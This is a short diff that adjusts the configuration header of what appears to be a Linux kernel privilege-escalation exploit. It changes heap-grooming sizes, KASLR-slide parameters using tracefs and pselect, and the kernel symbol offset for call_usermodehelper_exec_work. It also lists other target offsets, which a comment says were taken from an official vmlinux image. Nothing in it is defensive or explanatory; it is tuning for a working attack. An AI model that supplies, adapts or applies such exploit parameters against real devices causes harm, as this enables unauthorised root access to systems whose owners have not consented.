@@ -48,7 +48,7 @@
 // ============================================================================
 // KERNELSNITCH & HEAP CONFIGS
 // ============================================================================
-#define MM_STRUCT_SZ 0x3C0
+#define MM_STRUCT_SZ 0x400 
 #define MM_ORDER 3
 #define KERNELSNITCH_MTE_ENABLED 1
 #define KERNELSNITCH_VERBOSE 1
@@ -89,7 +89,7 @@
 #define SLIDE_USE_FAKE_TASK 1
 #define SLIDE_TRACEFS_EVENT_ID 106
 #define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000def04ULL
-#define SLIDE_PSELECT_WORD_SHIFT 0
+#define SLIDE_PSELECT_WORD_SHIFT 11 
 #define SLIDE_P0_OFFSET_CANDIDATES  \
   0x000000ULL, 0x010000ULL, 0x020000ULL, 0x030000ULL,  \
   0x040000ULL, 0x050000ULL, 0x060000ULL, 0x070000ULL,  \
@@ -147,7 +147,7 @@
 // ============================================================================
 // SYMBOL OFFSETS - EXTRAIDOS DO vmlinux.elf ZTO OFICIAL
 // ============================================================================
-#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000d75c8ULL
+#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000d7918ULL // Era 0x000d75c8
 #define NOOP_LLSEEK_OFF 0x0039b408ULL
 #define COPY_SPLICE_READ_OFF 0x003e8a4cULL
 #define CONFIGFS_READ_ITER_OFF 0x00468f74ULL
